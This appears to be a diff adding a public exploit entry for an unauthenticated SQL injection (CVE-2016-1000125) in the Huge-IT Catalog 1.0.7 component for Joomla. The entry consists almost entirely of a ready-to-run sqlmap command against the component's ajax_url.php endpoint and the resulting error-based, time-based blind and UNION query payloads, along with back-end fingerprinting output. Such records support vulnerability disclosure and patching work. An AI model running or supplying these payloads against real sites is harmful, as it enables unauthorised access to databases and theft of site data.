@@ -1,0 +1,36 @@
+# Exploit Title Unauthenticated SQL Injection in Huge-IT Catalog v1.0.7 for Joomla
+# Date: 2016-09-16
+# Exploit Author: Larry W. Cashdollar, @_larry0
+# Vendor Homepage: http://huge-it.com/joomla-catalog/
+# Software Link: 
+# Version: 1.0.7
+# Tested on: Linux
+# CVE : CVE-2016-1000125
+# Advisory: http://www.vapidlabs.com/advisory.php?v=171
+# Exploit:
+	• $ sqlmap -u 'http://example.com/components/com_catalog/ajax_url.php' --data="prod_page=1&post=load_more_elements_into_catalog&catalog_id=*&old_count=*&count_into_page=*&show_thumbs=*&show_description=*&parmalink=*"
+	•  
+	• Parameter: #1* ((custom) POST)
+	•     Type: error-based
+	•     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+	•     Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=-2369 OR 1 GROUP BY CONCAT(0x717a627871,(SELECT (CASE WHEN (1973=1973) THEN 1 ELSE 0 END)),0x716b787671,FLOOR(RAND(0)*2)) HAVING MIN(0)#&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=
+	•  
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=(CASE WHEN (7371=7371) THEN SLEEP(5) ELSE 7371 END)&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=
+	•  
+	•     Type: UNION query
+	•     Title: Generic UNION query (random number) - 15 columns
+	•     Payload: prod_page=1&post=load_more_elements_into_catalog&catalog_id=-5943 UNION ALL SELECT 2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,2434,CONCAT(0x717a627871,0x494a475477424c724f6f7853556d61597544576f4b614d6e41596771595253476c4251797a685974,0x716b787671)-- FvOy&old_count=&count_into_page=&show_thumbs=&show_description=&parmalink=
+	• ---
+	• [16:48:10] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Debian 8.0 (jessie)
+	• web application technology: Apache 2.4.10
+	• back-end DBMS: MySQL >= 5.0.12
+	• [16:48:10] [WARNING] HTTP error codes detected during run:
+	• 500 (Internal Server Error) - 6637 times
+	• [16:48:10] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com'
+	•  
+	• [*] shutting down at 16:48:10
+
+
